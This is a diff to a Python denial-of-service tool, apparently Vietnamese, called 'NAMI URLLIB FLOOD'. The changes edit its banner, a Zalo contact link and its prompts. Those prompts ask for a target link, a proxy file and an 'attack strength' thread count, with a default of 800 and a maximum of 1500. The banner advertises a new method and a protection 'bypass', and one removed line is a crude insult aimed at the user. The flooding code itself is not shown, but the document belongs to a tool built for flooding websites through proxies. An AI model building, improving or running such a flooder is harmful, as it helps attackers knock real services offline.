@@ -184,17 +184,17 @@ class Spammer(threading.Thread):
         sys.exit(0)
 def title():
     stdout.write("                                                                                          \n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX   +"(_)   (_)       NAMI      (_)                   \n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX   +"(__)_ (_)  ____   __   __   _                  \n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX   +"(_)(_)(_) (____) (__)_(__) (_)                \n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX   +"(_)  (__)( )_( )(_) (_) (_)(_)                \n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX   +"(_)   (_) (__)_)(_) (_) (_)(_)  Version 2.2   \n")
-    stdout.write("                   "+Fore.LIGHTWHITE_EX   +"                                            \n")
+    stdout.write("                   ""       (_)   (_)                  (_)                   \n")
+    stdout.write("                   ""       (__)_ (_)  ____   __   __   _                   \n")
+    stdout.write("                   ""       (_)(_)(_) (____) (__)_(__) (_)                \n")
+    stdout.write("                   ""       (_)  (__)( )_( )(_) (_) (_)(_)                \n")
+    stdout.write("                   ""       (_)   (_) (__)_)(_) (_) (_)(_)                \n")
+    stdout.write("                   ""                                                \n")
     stdout.write("             "            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             "+"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+"║             NAMI-V2.2 URLLIB FLOOD        ""          ║\n")
+    stdout.write("             "+"║             NAMI URLLIB FLOOD             ""          ║\n")
     stdout.write("             "+"║        ADDED NEW METHOD AND BYPASS    ""              ║\n")
-    stdout.write("             "+"║        Zalo: https://zalo.me/0765698140   ""          ║\n")
+    stdout.write("             "+"║        ZALO: https://zalo.me/0765698140   ""          ║\n")
     stdout.write("             "+"╚═════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -222,20 +222,20 @@ class MainLoop():
                 response = urllib.request.urlopen(req)
                 break
             except:
-                print ('> Không thể mở link.')
+                print ('> Không thể mở liên kết này do có anti hoặc sai link vui lòng check lại.')
         while True:            
             try:
-                l = str(input('> Nhập proxy NHANH = proxy.txt: '))
+                l = str(input('> Nhập file proxy mặc dịnh là proxy.txt: '))
                 in_file = open(l,"r")
                 lista = []
                 for i in in_file:
                     lista.append(i.split("/n")[0])
                 break
             except:
-                print ('MÀY NHẬP SAI TÊN FILE THẰNG NGU ÓC LỒN.')
+                print ('Lỗi đọc tệp tin vui lòng xem lại tên file.')
         while True:                
             try:
-                num_threads = int(input('> Nhập số lượng máy chủ atak [800]: '))
+                num_threads = int(input('> Nhập sức mạnh tấn công bình thường [800] Max 1500: '))
             except:
                 num_threads = 800
             break
